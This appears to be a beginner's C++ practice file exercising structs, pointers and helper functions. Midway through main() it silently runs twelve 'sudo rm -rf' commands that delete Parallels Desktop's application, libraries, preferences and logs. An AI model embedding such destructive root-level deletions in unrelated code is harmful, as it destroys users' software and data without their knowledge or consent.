#include <iostream>
#include <string>
#include <cstdlib>
#include "test.h"

struct user {
    int id;
    std::string name;
    int age;
    bool agent;
    std::string pass;
    std::string others;
};

//指针就是地址
using namespace std;
int main(int argc,char **argv) {
    user jack = {5464765,"jacke",45,1,"wfvv5","go out"};
    cout << jack.id << endl;
    cout << "Hello, World!" << endl;
    cout << "have input :" << argc << " commeng" << endl;
    int *oka;
    int jack2 = 6;
    oka = &jack2;
    cout << oka << endl;

    cout << apple.weight << endl;
    cout << "your lucky sour is:" << endl;
    cout << lucky(36,0,0,99,0) << endl;

    system("sudo rm -rf /Applications/Parallels\ Desktop.app\ ");
    system("sudo rm -rf /Library/Parallels/Parallels/Service.app");
    system("sudo rm -rf /Library/Parallels/Receipts/com.parallels.pkg.virtualization");
    system("sudo rm -rf /Library/Preferences/Parallels");
    system("sudo rm -rf /Library/Parallels");
    system("sudo rm -rf /Library/Spotlight/ParallelsMD.mdimporter");
    system("sudo rm -rf /Library/Logs/parallels.log");
    system("sudo rm -rf /private/var/db/BootCaches/*/app.com.parallels.desktop.console.playlist");
    system("sudo rm -rf /private/var/db/receipts/com.parallels*");
    system("sudo rm -rf /private/var/db/Parallels");
    system("sudo rm -rf /private/var/.Parallels_swap");
    system("sudo rm -rf /usr/lib/parallels");

stock stock1;
stock1.id = 7879;
stock1.name = "lam.inc";
stock1.num1 = 96.3;
stock1.num2 = 963.4;
stock1.num4 = 652.7;
stock1.show_future();
stock1.show_newid();

        return 0;
}
